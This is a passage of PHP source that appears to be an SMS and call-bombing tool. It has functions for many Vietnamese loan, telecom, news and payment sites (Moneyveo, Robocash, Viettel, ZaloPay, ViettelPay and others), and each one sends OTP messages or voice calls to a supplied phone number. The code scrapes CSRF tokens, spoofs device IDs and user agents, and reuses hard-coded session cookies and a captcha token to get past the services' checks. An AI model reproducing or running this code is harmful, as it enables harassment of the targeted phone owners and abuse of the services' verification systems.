		"cookie: SN5c8116d5e6183=3tv1o7ton9n12jtnug96f8d8ut;OnCredit_id=643e0edf695496.07498174;fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=TGp96BSUW5IwMh0JgHeUd49rmhRq1triMmGzLzWzvCI=;GN_USER_ID_KEY=66bb4878-093a-4dfc-9f25-3ee94accd97a;GN_SESSION_ID_KEY=fd64cde4-6459-4ff0-8a68-7770bd9aa247"
	);
	$get = CURL("GET", "https://oncredit.vn/registration", null, $head, false);
	$token = explode('"', explode('name="CSRFToken" content="', $get)[1])[0];
	$data = "data%5BtypeData%5D=sendCodeReg&data%5Bphone%5D=".$phone."&data%5Bemail%5D=Nguyênksjjrf%40gmail.com&data%5Bcaptcha1%5D=1&data%5Blang%5D=vi&CSRFName=CSRFGuard_ajax&CSRFToken=".$token;
	$get = json_decode(CURL("POST", "https://oncredit.vn/?ajax", $data, $head, false),true);
	if($get["message"] == "OK") {
		return true; 
	} else {
		return false; 
	}
}
//otp call
function MONEYVEO($phone){
	$head = array(
		"Host: moneyveo.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"traceparent: 00-".generateRandomString(strlen("c771ff34b940c30df615b678478fce28"))."-".generateRandomString(strlen("1e0ba42c6725b148"))."-00",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"referer: https://moneyveo.vn/vi/registernew/",
	);
	$get = CURL("GET", "https://moneyveo.vn/vi/registernew/", null, $head, true);
	$ck = explode(";", explode("set-cookie: ", $get)[1])[0].";";
	$data = 'phoneNumber='.$phone;
	$head = array(
		"Host: moneyveo.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"traceparent: 00-".generateRandomString(strlen("c771ff34b940c30df615b678478fce28"))."-".generateRandomString(strlen("1e0ba42c6725b148"))."-00",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"referer: https://moneyveo.vn/vi/registernew/",
		"cookie: ".$ck
	);
	$access = json(CURL("POST", "https://moneyveo.vn/vi/registernew/sendsmsjson/", $data, $head, false));
	if($access["succeed"] == "true" or $GET["succeed"] == 1){
		return true; 
	} else {
		return false; 
	}
}
//otp ///
function VAYVND($phone){
	$head = array(
		"Host: api.vayvnd.vn",
		"accept: application/json",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://vayvnd.vn",
		"referer: https://vayvnd.vn/",
	);
	$data = '{
  "phone": "'.$phone.'",
  "utm_campaign": "null",
  "cpa_id": 7,
  "cpa_lead_data": {
    "click_id": "'.generateImei().'",
    "source_id": "source_6",
    "utm_score": "0.0'.generateRandomstr(strlen("13672266155481339")).'"
  },
  "utm_list": [
    {
      "utm_source": "jeffapp"
    }
  ],
  "source_site": 1,
  "reg_screen_resolution": {
    "width": 412,
    "height": 915
  }
}';
	$GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users", $data, $head, false));
	if($GET["data"]["id"]){
		return true; 
	} else {
		$data = '{"login":"'.$phone.'"}';
		$GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users/password-reset", $data, $head, false));
		if($GET["result"] == 1 or $GET["result"] == "true") {
			return true; 
		} else {
			return false; 
		}
	}
}
//otp call
function ROBOCASH($phone){
	$head = array(
		"Host: robocash.vn",
		"cache-control: max-age=0",
		"upgrade-insecure-requests: 1",
		"origin: https://robocash.vn",
		"content-type: application/x-www-form-urlencoded",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"referer: https://robocash.vn/?utm_source=seo&utm_term=https://robocash.vn/vay-tien-nhanh",
		"cookie: __cfruid=96b1c440a99f8a9b4500db9003fba029530f7efd-1681472457;_fbp=fb.1.1681472466567.1755259407;ec_png_utm=7df928dd-d32f-9b30-de56-3fdc350de09b;ec_etag_utm=7df928dd-d32f-9b30-de56-3fdc350de09b;ec_cache_utm=7df928dd-d32f-9b30-de56-3fdc350de09b;uid=7df928dd-d32f-9b30-de56-3fdc350de09b;ec_png_client=false;ec_etag_client=false;ec_cache_client=false;client=false;ec_png_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;ec_etag_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;ec_cache_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;XSRF-TOKEN=eyJpdiI6IjF3ZS9oVzgzNm44dERDZTZvc05ubVE9PSIsInZhbHVlIjoiM0FrclFqU1V2RDVrMFdlOUFoNmlQUzN4c1U4SWVUWFViUm41cDcyWWkyQ0VaaWg2WUtMQVVDZm9nNlQyNWV4dHhTME45QTdNdlFwZ2t4R0ZLWFd6RXJRKzNkSE9WOTV2SE1NWlhneGw0RXl1Q3M4SWZaR1RuUGJtVlBhVzhMTnIiLCJtYWMiOiJlNjE2YTZhNGYyN2VlZTA0YjU2NGIwYjlhOTAxZjUyM2E3Y2NhZDkwZTRjZTRlOWFkNWNlNDZiODQ3YjM2ZWIyIiwidGFnIjoiIn0%3D;sessionid=eyJpdiI6IjRGN1A0UEJFRE8wbTRqUlNrdzhKWUE9PSIsInZhbHVlIjoieXNzOEIrbXMxR0l4R0FSZGtSN1hBUnduUy94ak1jQzhZdEViUGdhTkNKWG1aVThqd1NzY0pVVGhvRjk2L0RpNk40UEZZcnhESU12U3U5bGRGdnVSN1JPYzNHZUpYRUg2RDlvajh6MGNINVB2MEdDWDBXeXZOYzcveXFBMHF5OUciLCJtYWMiOiJkYTNiM2U4ZGQ2NDdjNTA3MGE5Y2RhOGQ2YTkwNTU4YjI4MTI0MDA0MDRkYWY5MTA4MmQzMWQ1ZTcxMzc5MjQxIiwidGFnIjoiIn0%3D;utm_uid=eyJpdiI6ImF4cTdnZGsyNVNGemtpTDJ0N05oR0E9PSIsInZhbHVlIjoicWo5eG1YRUIrSzhHeVE4L0hKYlBBN0k4bnpKaDNQcTk3cEVQNmNjZTgrMWN0ejQ3bk9kbW1Ndkl4dEd5R2JSZW02cmtjRlpmN3V2Y1p3clVzek1qUmN6RHRCam5ybkljRG81R0NZNzREVFNKUkFYM0hiM1VsbGEySVFDczBROWYiLCJtYWMiOiJhZTQzZmNlYjEzYmMzN2Q3ZWUxNjQ1NDM1Y2ZlOGU5OTVlODJlYzg1MjVlNjViN2Y2NWM2M2I4ZjVkNzE4ZTkwIiwidGFnIjoiIn0%3D"
	);
	$GET = CURL("GET", "https://robocash.vn/?utm_source=seo&utm_term=https://robocash.vn/vay-tien-nhanh", null, $head, false);
	$token = explode('"', explode('name="_token" value="', $GET)[1])[0];
	$data = "_token=".$token."&_token=".$token."&amount=5+000+000&term=14&phone=".$phone;
	$GET = CURL("POST", "https://robocash.vn/guest/application/create", $data, $head, false);
	if (strpos ($GET, 'class="login">Đăng nhập') !== false){
		return true; 
	} else {
		return false; 
	}
}
//otp
function LOSHIP($phone){
	$a = "84". $phone;
	$usersdt = explode("840", $a)[1];
	$head = array(
		"Host: latte.lozi.vn",
		"accept-language: vi_VN",
		"x-access-token: unknown",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://loship.vn",
		"referer: https://loship.vn/",
	);
	$data = '{"device":"Android 12","platform":"Chrome WebView/96.0.4664.104","countryCode":"84","phoneNumber":"'.$phone.'"}';
	$GET = CURL("POST", "https://latte.lozi.vn/v1.2/auth/register/phone/initial", $data, $head,false);
	if (strpos ($GET, $usersdt) !== false){
		return true; 
	} else {
		return false; 
	}
}
//otp
function TUOITRE($phone){
	$head = array(
		"Host: tuoitre.vn",
		"accept: application/json, text/plain, */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
		"origin: https://sso.tuoitre.vn",
		"cookie: _ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselhsTG9RV1BYRWNvWXpHVjE4djJsTWlxS2d2dmF6Zk1EZGlCekVTbzRNc2xSclc5MmJvVkVGRWp4aUpjMUFjQ2lVRWNBRVhHbkdmTzdTQzRPTlp6clF6eUczNGk0Y2xHRkEwaXhUbitTbk8iLCJtYWMiOiJhNjNjYjlmNTA1YjNmYmJiMDJkMjMyZmFkOGE2NzYyMTQ3NzY4ZmNiYzA5MDg4M2ExZmYxNWZlMzY0ZjM2NGU3IiwidGFnIjoiIn0%3D"
	);
	$get = CURL("GET", "https://tuoitre.vn", null, $head, false);
	$token_a = explode("'", explode("VideoToken: '", $get)[1])[0];
	$head = array(
		"Host: sso.tuoitre.vn",
		"accept: application/json, text/plain, */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
		"origin: https://sso.tuoitre.vn",
		"sec-fetch-site: same-origin",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"cookie: _ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselhsTG9RV1BYRWNvWXpHVjE4djJsTWlxS2d2dmF6Zk1EZGlCekVTbzRNc2xSclc5MmJvVkVGRWp4aUpjMUFjQ2lVRWNBRVhHbkdmTzdTQzRPTlp6clF6eUczNGk0Y2xHRkEwaXhUbitTbk8iLCJtYWMiOiJhNjNjYjlmNTA1YjNmYmJiMDJkMjMyZmFkOGE2NzYyMTQ3NzY4ZmNiYzA5MDg4M2ExZmYxNWZlMzY0ZjM2NGU3IiwidGFnIjoiIn0%3D"
	);
	$get = CURL("GET", "https://sso.tuoitre.vn/otp?redirectUrl=https://tuoitre.vn/&state=eyJ".$token_a, null, $head, false);
	$token_b = explode('"', explode('name="csrf-token" content="', $get)[1])[0];
	$head = array(
		"Host: sso.tuoitre.vn",
		"accept: application/json, text/plain, */*",
		"x-xsrf-token: eyJ".$token_a,
		"x-csrf-token: ".$token_b,
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
		"origin: https://sso.tuoitre.vn",
		"referer: https://sso.tuoitre.vn/otp?redirectUrl=https%3A%2F%2Ftuoitre.vn%2Fvay-tien-qua-app-qua-nhanh-qua-nguy-hiem-20190703082332659.htm&state=eyJpdiI6IlU5Y1p0Y3NpVTBtdkF5K29zNHM2SGc9PSIsInZhbHVlIjoiRVN6TjlscXZ4SmtCUW5WYkdoM1M2emJWc216Q1RrQlNFK1FWR3dXTC9DSDdBQ3gwa3FuYmQ1YlBjQlFzMXYvSHo3cHIvaHFScWZtMUZPV284S3JqalhCRzZNNDFIb2EyVldYd3VYZ2pleHJHTzR3bVhEb2pxRGtua2s4bHFNcS90YjlaL09URWVUSG5uQnJSREhNNUlRalAyVG05c2E5dVFTUWE0aG9Tb21lNytFVnVuVWxwQ1ZzNEFsVVdhbTNhcVlaL3ZZVm10Rzczc2xwWWV5eDFjcks5dDBSM3FNczAzNi8yb09YM2lBQ2F2eXN6UHVhTnFoUXNjNTFhaUQyeS9HNmpLQ2crcFh6WDQzTTFsa2R6R04rY1QyYmpvOFBtNDAvZ2w0amVKVWk0bEtNQzlnQUFBaFFIRFQ3REdjR2pMNjI1TG4ycTVmK3E4T004MmgweXE2TFNUSEZYMTRwWEF1VnFtUzBMeG9iTHVaTVd4MEVWUUpGRFAxbkVlMC9XIiwibWFjIjoiNjVjMThmNGY4YjYyMzdlNGZkNDA2NTlmMzVkZTQ2MjgwNzUyOTc3YWE4NzBmZjE5YTQxY2Y2NTQ4NTA4YTQwZiIsInRhZyI6IiJ9",
		"cookie: _ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselhsTG9RV1BYRWNvWXpHVjE4djJsTWlxS2d2dmF6Zk1EZGlCekVTbzRNc2xSclc5MmJvVkVGRWp4aUpjMUFjQ2lVRWNBRVhHbkdmTzdTQzRPTlp6clF6eUczNGk0Y2xHRkEwaXhUbitTbk8iLCJtYWMiOiJhNjNjYjlmNTA1YjNmYmJiMDJkMjMyZmFkOGE2NzYyMTQ3NzY4ZmNiYzA5MDg4M2ExZmYxNWZlMzY0ZjM2NGU3IiwidGFnIjoiIn0%3D"
	);
	$data = '------WebKitFormBoundary6tasV7gdCXo1XomC
Content-Disposition: form-data; name="phone"

'.$phone.'
------WebKitFormBoundary6tasV7gdCXo1XomC--';
	$access = json(CURL("POST", "https://sso.tuoitre.vn/receive-otp", $data, $head, false));
	if($access["success"] == 1){
		return true; 
	} else {
		return false; 
	}
}
//otp
function ATM($phone){
	$head = array(
		"Host: atmonline.vn",
		"accept: application/json, text/javascript, */*; q=0.01",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://atmonline.vn",
		"referer: https://atmonline.vn/",
		"cookie: SESSION=".generateRandom(strlen("YmIyMjJhOTgtNGE0OS00NTgxLTg2YTYtNzk3N2FhNDM2ZTI1")).";DESIGN_TYPE=NEW;_fw_crm_v=".generateImei()
	);
	$data = '{"mobilePhone":"'.$phone.'","source":"ONLINE"}';
	$GET = json(CURL("POST", "https://atmonline.vn/back-office/api/json/auth/sendAcceptanceCode", $data, $head, false));
	if($GET["actionIdentifier"]){
		return true; 
	} else {
		return false; 
	}
}
//otp
function VIEON($phone){
	$head = array(
		"Host: vieon.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded",
		"origin: https://vieon.vn",
		"referer: https://vieon.vn/",
	);
	$access = CURL("GET", "https://vieon.vn/", null, $head, false);
	$token = explode('"', explode('"token":"', $access)[1])[0];
	$head = array(
		"Host: api.vieon.vn",
		"accept: application/json, text/plain, */*",
		"authorization: ".$token,
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded",
		"origin: https://vieon.vn",
		"referer: https://vieon.vn/",
	);
	$data = 'phone_number='.$phone.'&password=123456789&given_name=&device_id=598a3da6a4b7d1450b2a247bd080ca9d&platform=mobile_web&model=Android%2012&push_token=&device_name=Chrome%2F96&device_type=desktop&ui=012021';
	$access = json(CURL("POST", "https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021", $data, $head, false));
	if($access["error"] == 400){
		$data = 'phone_number='.$phone.'&platform=mobile_web&ui=012021';
		$access = json(CURL("POST", "https://api.vieon.vn/backend/user/forget/forget_password?platform=mobile_web&ui=012021", $data, $head, false));
	}
	if($access["register_session_id"] or $access["status"] == 1){
		return true; 
	} else {
		return false; 
	}
}
//otp call
function DONGPLUS($phone){
	$phone = "84". $phone;
	$phone = explode("840", $phone)[1];
	$head = array(
		"Host: api.dongplus.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://dongplus.vn",
		"referer: https://dongplusvn/user/login",
	);
	$data = '{"full_name":"Thái Nguyên","first_name":"Thái","last_name":"Nguyên","mobile_phone":"84'.$phone.'","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}';
	CURL("POST", "https://api.dongplus.vn/api/user", $data, $head, false);
	$data = '{"phone":"84'.$phone.'"}';
	$access = CURL("POST", "https://api.dongplus.vn/api/user/send-one-time-password", $data, $head, false);
	if(json_decode($access,true)["loan_processing_enabled"] == ""){
		return true; 
	} else {
		return false; 
	}
}
//otp call
function TIENOI($phone){
	$head = array(
		"Host: app.tienoi.com.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://app.tienoi.com.vn",
		"referer: https://app.tienoi.com.vn/auth/registration?need=2000000&days=14",
	);
	$data = '{"mobilePhone":"'.$phone.'","password":"A123456789a","passwordConfirmation":"A123456789a","isVoiceSms":true}';
	$access = CURL("POST", "https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode", $data, $head, false);
	if(json($access)["id"]){
		return false; 
	} else {
		return true; 
	}
}
//otp
function F88($phone){
	$head = array(
		'Host: api.f88.vn',
		'accept: application/json, text/plain, */*',
		'content-encoding: gzip',
		'user-agent: Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36',
		'content-type: application/json',
		'origin: https://online.f88.vn',
		'referer: https://online.f88.vn/',
	);
	$data = '{"phoneNumber":"'.$phone.'","recaptchaResponse":"03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO","source":"Online"}';
	$access = json(CURL("POST", "https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", $data, $head, false));
	if($access["message"] == "Gửi mã OTP thành công."){
		return true; 
	} else {
		return false; 
	}
}
//otp
function TAMO($phone){
	$head = array(
		"Host: api.tamo.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
		"content-type: application/json;charset=UTF-8",
		"origin: https://www.tamo.vn",
		"referer: https://www.tamo.vn/",
	);
	$data = '{"mobilePhone":{"number":"'.$phone.'"}}';
	$access = json(CURL("POST", "https://api.tamo.vn/web/public/client/phone/sms-code-ts", $data, $head, false));
	if($access["data"][0] == ""){
		return true; 
	} else {
		return false; 
	}
}
//otp
function META($phone){
	$head = array(
		"Host: meta.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://meta.vn",
		"referer: https://meta.vn/account/register",
		"cookie: _ssid=smfszyszu3tq5h02lmly12yz;_cart_=fc5bf0de-45de-4323-a007-f7860e71a5a1;__ckmid=262a67477e774f56b3de7e656e741682"
	);
	$data = '{"api_args":{"lgUser":"'.$phone.'","act":"send","type":"phone"},"api_method":"CheckExist"}';
	$GET= json(CURL("POST", "https://meta.vn/app_scripts/pages/AccountReact.aspx?api_mode=1", $data, $head, false));
	if($GET["Status"] == "send_ok"){
		return true; 
	} else {
		return false; 
	}
}
//otp
function VIETTELL($phone){
	$head = array(
		"Host: vietteltelecom.vn",
		"Connection: keep-alive",
		"X-CSRF-TOKEN: mXy4RvYExDOIR62HlNUuGjVUhnpKgMA57LhtHQ5I",
		"User-Agent: Mozilla/5.0 (Linux; Android 10; RMX3063) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Accept: application/json, text/plain, */*",
		"Referer: https://vietteltelecom.vn/dang-nhap",
	);
	$data = array(
		"phone" => $phone,
		"type" => ""
	);
	$GET = json(CURL("POST", "https://vietteltelecom.vn/api/get-otp-login", json_encode($data), $head, false));
	if($GET["code"] == 200){
		return true; 
	} else {
		return false; 
	}
}
//otp
function VETTELL2($phone){
	$head = array(
		"Host: viettel.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"X-Requested-With: XMLHttpRequest",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Origin: https://viettel.vn",
	);
	$GET = CURL("GET", "https://viettel.vn/dang-ky", null, $head, false);
	$token = explode('"', explode('name="csrf-token" content="', $GET)[1])[0];
	$head = array(
		"Host: viettel.vn",
		"Connection: keep-alive",
		"Accept: application/json, text/plain, */*",
		"X-XSRF-TOKEN: eyJpdiI6Ik1tKzdYTWlYXC9jenl1OVRTNjlRV253PT0iLCJ2YWx1ZSI6IjZQdkY5SHpUVDdRSXdRUzlRRkx4Z2tKeW91RkZoTkhWQXZzU01EQzhHVW9cL2ZiK2lKZzMxYndhWWp4NmJkVmhWIiwibWFjIjoiMDNkMTVkNzhkODE1ZTA4ZjI0MTVlMmU5MDJhZjUwMTY5MGIxNDgyN2Q2MzZlNDJhNDNkNDQyZjJkNWVjZDk5MyJ9",
		"X-CSRF-TOKEN: ".$token,
		"X-Requested-With: XMLHttpRequest",
		"User-Agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"Content-Type: application/json;charset=UTF-8",
		"Origin: https://viettel.vn",
		"Referer: https://viettel.vn/dang-nhap",
	);
	$data = '{"msisdn":"'.$phone.'"}';
	$GET = json(CURL("POST", "https://viettel.vn/api/get-otp", $data, $head, false));
	if($GET["code"] == 200){
		return true; 
	} else {
		return false; 
	}
}
//otp
function ZALOPAY($phone) {
	$head = array(
		"Host: api.zalopay.vn",
		"x-platform: NATIVE",
		"x-device-os: ANDROID",
		"x-device-id: 690354367d96c358",
		"x-device-model: Samsung SM-A217F",
		"x-app-version: 7.16.0",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 ZaloPay Android / 9881",
		"x-density: xhdpi",
		"authorization: Bearer",
		"x-drsite: off",
		"accept-encoding: gzip",
	);
	$get = json(CURL("GET", "https://api.zalopay.vn/v2/account/phone/status?phone_number=".$phone, null, $head, false));
	$token = $get["data"]["send_otp_token"];
	$data = '{"phone_number":"'.$phone.'","send_otp_token":"'.$token.'"}';
	$get = json(CURL("POST", "https://api.zalopay.vn/v2/account/otp", $data, $head, false));
	if($get["error"] == 1){
		return false; 
	} else {
		return true; 
	}
}
//otp
function VTPAY($phone){
	$head = array(
		"Host: api8.viettelpay.vn",
		"product: VIETTELPAY",
		"accept-language: vi",
		"authority-party: APP",
		"channel: APP",
		"type-os: android",
		"app-version: 5.1.4",
		"os-version: 10",
		"imei: "."VTP_".strtoupper(generateRandomString(32)),
		"x-request-id: ".date("YmdHis"),
		"content-type: application/json; charset=UTF-8",
		"user-agent: okhttp/4.2.2"
	);
	$data = array(
		"type" => "msisdn",
		"username" => $phone
	);
	$GET = json(CURL("POST", "https://api8.viettelpay.vn/customer/v1/validate/account", json_encode($data), $head, false));
	if ($GET["status"]["code"] == "CS9901") {
		$data = array(
			"hash" => "",
			"identityType" => "msisdn",
			"identityValue" => $phone,
			"imei" => "VTP_".strtoupper(generateRandomString(32)),
			"notifyToken" => "",
			"otp" => "android",
			"pin" => "VTP_".strtoupper(generateRandomString(32)),
			"transactionId" => "",
			"type" => "REGISTER",
			"typeOs" => "android",
			"verifyMethod" => "sms"
		);
		$GET = json(CURL("POST", "https://api8.viettelpay.vn/customer/v2/accounts/register", json_encode($data), $head, false));
	} else {
		$data = array(
			"imei" => "VTP_".strtoupper(generateRandomString(32)),
			"loginType" => "BASIC",
			"msisdn" => $phone,
			"otp" => "",
			"pin" => "VTP_".strtoupper(generateRandomString(32)),
			"requestId" => "",
			"typeOs" => "android",
			"userType" => "msisdn",
			"username" => $phone
		);
